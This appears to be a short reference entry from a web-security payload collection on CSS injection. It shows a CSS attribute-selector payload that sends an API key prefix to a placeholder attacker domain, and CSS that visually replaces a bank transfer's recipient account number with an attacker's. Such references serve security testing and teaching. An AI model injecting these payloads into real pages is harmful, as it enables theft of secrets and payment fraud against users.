# CSS Injection

## Table of Contents
- [Data Exfiltration](#data-exfiltration)
- [UI Redressing (Phishing)](#ui-redressing-phishing)

## Data Exfiltration

### Sensitive data on the page can be exfiltrated.

- API key stealing
    ```css
    input[name='api_key'][value^='secret_value_'] {
        background-image: url('https://[ATTACKER-DOMAIN]/?leak=secret_value_');
    }
    ```

## UI Redressing (Phishing)

### The user interface can be visually altered to mislead users or steal their credentials.

- Phishing
    ```html
    ...
    <div class="transfer-details">
        <p>Recipient Account Number:</p>
        <span id="account-number">123-456-7890</span>
    </div>
    ...
    ```

    ```css
    /* CSS injected by an attacker */
    #account-number {
        font-size: 0;
    }

    #account-number::after {
        content: "098-765-4321"; /* Attacker's account number */
        font-size: 1rem;
    }
    ```
